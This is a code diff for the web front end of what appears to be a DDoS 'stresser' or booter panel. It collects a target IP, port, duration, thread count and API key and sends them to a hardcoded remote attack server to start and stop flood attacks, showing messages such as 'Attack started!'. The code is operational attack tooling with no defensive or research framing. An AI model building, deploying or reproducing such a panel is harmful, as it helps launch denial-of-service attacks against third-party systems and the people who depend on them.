@@ -1,43 +1,54 @@
-function showPanel(panel) {
-  document.getElementById('launch').style.display = (panel === 'launch') ? 'block' : 'none';
-  document.getElementById('stop').style.display = (panel === 'stop') ? 'block' : 'none';
-}
+document.getElementById('attackForm').addEventListener('submit', function (event) {
+  event.preventDefault();
 
-function startAttack() {
-  const ip = document.getElementById("targetIP").value;
-  const port = document.getElementById("port").value;
-  const time = document.getElementById("duration").value;
-  const threads = document.getElementById("threads").value;
-  const apikey = document.getElementById("apiKey").value;
+  const ip = document.getElementById('ip').value;
+  const port = document.getElementById('port').value;
+  const time = document.getElementById('time').value;
+  const threads = document.getElementById('threads').value;
+  const apikey = document.getElementById('apikey').value;
 
-  fetch(`/start?ip=${ip}&port=${port}&time=${time}&threads=${threads}&apikey=${apikey}`)
-    .then(res => res.json())
+  if (!ip || !port || !time || !threads || !apikey) {
+    document.getElementById('response').innerHTML = `<p class="text-red-500">❌ All fields are required!</p>`;
+    return;
+  }
+
+  const url = `http://158.220.83.124:5000/start?ip=${ip}&port=${port}&time=${time}&threads=${threads}&apikey=${apikey}`;
+
+  document.getElementById('response').innerHTML = `<p class="text-blue-500">🚀 Sending attack...</p>`;
+
+  fetch(url)
+    .then(response => response.json())
     .then(data => {
-      document.getElementById("log").innerText = `✅ Started: Attack ID ${data.attack_id}`;
-      document.getElementById("attackID").value = data.attack_id;
-      document.getElementById("copyBtn").style.display = 'inline-block';
-    }).catch(err => {
-      document.getElementById("log").innerText = `❌ Error: ${err}`;
+      if (data.status === 'started') {
+        document.getElementById('response').innerHTML = `
+          <p class="text-green-500">✅ Attack started! ID: <strong>${data.attack_id}</strong></p>
+          <button onclick="stopAttack('${data.attack_id}')" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded mt-4">🛑 Stop Attack</button>
+        `;
+      } else {
+        document.getElementById('response').innerHTML = `<p class="text-red-500">❌ ${data.error}</p>`;
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      document.getElementById('response').innerHTML = `<p class="text-red-500">❌ Failed to start attack</p>`;
     });
-}
+});
 
-function stopAttack() {
-  const attack_id = document.getElementById("attackID").value;
+function stopAttack(id) {
+  const url = `http://158.220.83.124:5000/stop?attack_id=${id}`;
+  document.getElementById('response').innerHTML = `<p class="text-yellow-500">🛑 Stopping attack...</p>`;
 
-  fetch(`/stop?attack_id=${attack_id}`)
-    .then(res => res.json())
+  fetch(url)
+    .then(response => response.json())
     .then(data => {
-      document.getElementById("log").innerText = `🛑 ${data.status}`;
-    }).catch(err => {
-      document.getElementById("log").innerText = `❌ Error: ${err}`;
+      if (data.status) {
+        document.getElementById('response').innerHTML = `<p class="text-green-500">✅ ${data.status}</p>`;
+      } else {
+        document.getElementById('response').innerHTML = `<p class="text-red-500">❌ ${data.error}</p>`;
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      document.getElementById('response').innerHTML = `<p class="text-red-500">❌ Failed to stop attack</p>`;
     });
-}
-
-function copyToClipboard() {
-  const attackID = document.getElementById("attackID").value;
-  navigator.clipboard.writeText(attackID).then(() => {
-    document.getElementById("log").innerText = `📋 Attack ID copied: ${attackID}`;
-  }).catch(err => {
-    document.getElementById("log").innerText = `❌ Failed to copy Attack ID: ${err}`;
-  });
 }
